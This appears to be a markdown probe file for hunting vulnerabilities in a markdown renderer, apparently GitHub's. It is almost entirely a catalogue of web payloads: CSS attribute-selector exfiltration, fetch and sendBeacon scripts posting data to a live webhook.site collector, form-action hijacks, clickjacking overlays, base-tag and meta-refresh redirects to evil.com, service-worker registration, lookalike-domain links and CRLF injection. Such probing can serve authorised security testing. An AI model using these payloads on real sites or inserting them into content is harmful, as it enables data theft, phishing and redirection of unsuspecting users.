# v44: Multi-Vulnerability Hunt

> Testing ALL vulnerability classes - not just SSRF!

---

## 1. Protocol Handler Exploitation

<!-- Can we trigger dangerous protocol handlers? -->

[📧 Click to email](mailto:attacker@evil.com?subject=Leaked&body=Secret%20Data)

[📞 Click to call](tel:+1234567890)

[💬 SMS Link](sms:+1234567890?body=Leaked%20Data)

[📱 FaceTime](facetime:attacker@evil.com)

[💻 SSH Link](ssh://attacker@evil.com)

[📁 FTP Link](ftp://attacker.com/payload)

[🔗 SFTP](sftp://attacker.com/secret)

[📲 Intent (Android)](intent://evil.com#Intent;scheme=https;package=com.android.chrome;end)

[🍎 iOS Deep Link](shortcuts://run-shortcut?name=malicious)

[🎮 Steam](steam://run/480)

[💬 Discord](discord://invite/malicious)

[📺 Zoom](zoommtg://zoom.us/join?confno=123456789)

[🖥️ TeamViewer](teamviewer10://control?device=123456789)

---

## 2. Link Prefetch/Preload Exploitation

<!-- Can we force browser to prefetch/preconnect to attacker? -->

<link rel="prefetch" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-prefetch">

<link rel="preload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-preload" as="fetch">

<link rel="preconnect" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff">

<link rel="dns-prefetch" href="//f2a2ea2c-e29d-454f-890d-6815bd73f9ff.dnshook.site">

<link rel="stylesheet" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-stylesheet.css">

<link rel="import" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/link-import.html">

<link rel="modulepreload" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/module.js">

---

## 3. Meta Tag Exploitation

<!-- Meta refresh for open redirect -->

<meta http-equiv="refresh" content="0;url=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/meta-refresh">

<meta http-equiv="refresh" content="5;url=https://evil.com">

<meta name="referrer" content="unsafe-url">

<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline'">

<meta http-equiv="X-Frame-Options" content="ALLOW-FROM https://evil.com">

<meta http-equiv="Set-Cookie" content="session=hijacked">

<meta http-equiv="Content-Type" content="text/html">

---

## 4. SVG Use Element for Script Execution

<!-- SVG use can reference external SVGs with scripts -->

<svg width="100" height="100">
<use href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/malicious.svg#payload"></use>
</svg>

<svg width="100" height="100">
<use xlink:href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/xlink.svg#x"></use>
</svg>

<svg>
<image href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-image.gif"></image>
</svg>

<svg>
<foreignObject width="100%" height="100%">
<body xmlns="http://www.w3.org/1999/xhtml">
<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-fo-body2.gif">
</body>
</foreignObject>
</svg>

<svg>
<script href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/svg-script.js"></script>
</svg>

<svg><a xlink:href="javascript:alert(1)"><text y="20">Click me</text></a></svg>

---

## 5. CSS-Based Data Exfiltration

<!-- CSS can leak data via background-image on attribute selectors -->

<style>
input[value^="a"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-a); }
input[value^="b"] { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-exfil-b); }
@import url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-import.css);
* { background: url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/css-wildcard); }
</style>

<div style="background:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/inline-style)">Test</div>

<div style="list-style-image:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/list-style)">Test</div>

<div style="cursor:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/cursor.cur),auto">Cursor</div>

<div style="content:url(https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/content)">Content</div>

---

## 6. Open Redirect via Links

<!-- GitHub may follow these as redirects -->

[Protocol-relative redirect](//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-relative)

[Data URL](data:text/html,<script>location='https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/data-url'</script>)

[Blob URL attempt](blob:https://github.com/12345678-1234-1234-1234-123456789012)

[About URL](about:blank#<script>fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff')</script>)

[View-source](view-source:https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff)

---

## 7. Clickjacking/UI Redress

<!-- Overlay elements to trick clicks -->

<div style="position:fixed;top:0;left:0;width:100%;height:100%;opacity:0.01;z-index:9999">
<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/clickjack" style="display:block;width:100%;height:100%"></a>
</div>

<div style="position:absolute;top:100px;left:100px;">
<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/overlay-click">
<button style="opacity:0.01">Secret Button</button>
</a>
</div>

---

## 8. Form Action Hijack

<!-- Forms that submit to attacker -->

<form action="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/form-action" method="POST">
<input name="secret" value="leaked">
<input type="submit" value="Submit">
</form>

<form id="leak"><input name="x" form="leak"></form>
<button form="leak" formaction="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/formaction">Click</button>

<input type="image" src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/input-image.gif" formaction="https://evil.com">

---

## 9. Iframe/Object Embedding

<!-- Can we embed external content? -->

<iframe src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/iframe"></iframe>

<iframe srcdoc="<img src=https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/srcdoc-img>"></iframe>

<object data="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/object" type="text/html"></object>

<embed src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/embed" type="text/html">

<applet code="evil" archive="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/applet.jar"></applet>

---

## 10. Base Tag Hijacking

<!-- Change base URL for all relative links -->

<base href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/">

<a href="relative-link">This should go to webhook if base works</a>

<img src="base-hijack.gif">

---

## 11. Service Worker Registration

<!-- Can we register a service worker? -->

<script>navigator.serviceWorker.register('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/sw.js')</script>

---

## 12. WebSocket/EventSource

<!-- Real-time data exfil -->

<script>
new WebSocket('wss://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff');
new EventSource('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/eventsource');
</script>

---

## 13. Portal Element (Chrome)

<portal src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/portal"></portal>

---

## 14. Manifest/Icons

<link rel="manifest" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/manifest.json">

<link rel="icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/favicon.ico">

<link rel="apple-touch-icon" href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/apple-icon.png">

---

## 15. Ping Attribute

<a href="#" ping="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/ping-attr">Click to ping</a>

---

## 16. Video/Audio Poster/Track

<video poster="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video-poster.gif">
<source src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/video.mp4">
<track src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/track.vtt" kind="captions">
</video>

<audio src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/audio.mp3"></audio>

---

## 17. Template/Slot Content Injection

<template>
<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/template-direct.gif">
<script>alert(1)</script>
</template>

<slot name="evil"><img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/slot.gif"></slot>

---

## 18. Noscript Fallback

<noscript>
<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/noscript-direct.gif">
<meta http-equiv="refresh" content="0;url=https://evil.com">
</noscript>

---

## 19. Canvas/WebGL Exfil

<canvas id="c"></canvas>
<script>
var c = document.getElementById('c');
var ctx = c.getContext('2d');
var img = new Image();
img.crossOrigin = 'anonymous';
img.onload = function() {
  ctx.drawImage(img, 0, 0);
  fetch('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/canvas', {
    method: 'POST',
    body: c.toDataURL()
  });
};
img.src = 'https://github.com/favicon.ico';
</script>

---

## 20. Beacon API

<script>navigator.sendBeacon('https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/beacon', 'data')</script>

---

## 21. Relative Path Confusion

<img src="../../../webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/path-traversal.gif">

<img src="//webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/proto-rel-img.gif">

<a href="\\webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/backslash">Backslash</a>

---

## 22. ASCII Smuggling (Lookalike Domains)

<a href="https://ɢithub.com/fake">Fake GitHub (Greek G)</a>

<a href="https://github.cοm/fake">Fake .com (Greek omicron)</a>

<img src="https://ɢithub.com/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/punycode.gif">

---

## 23. BOM/Encoding Tricks

﻿<script>alert(1)</script>

<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/bom%ef%bb%bf.gif">

---

## 24. CRLF Injection

<a href="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/%0d%0aSet-Cookie:evil=1">CRLF</a>

---

## 25. Simple Working Image (Control)

<img src="https://webhook.site/f2a2ea2c-e29d-454f-890d-6815bd73f9ff/control-img.gif">

---

**v44 - Hunting ALL vulnerabilities, not just SSRF!**
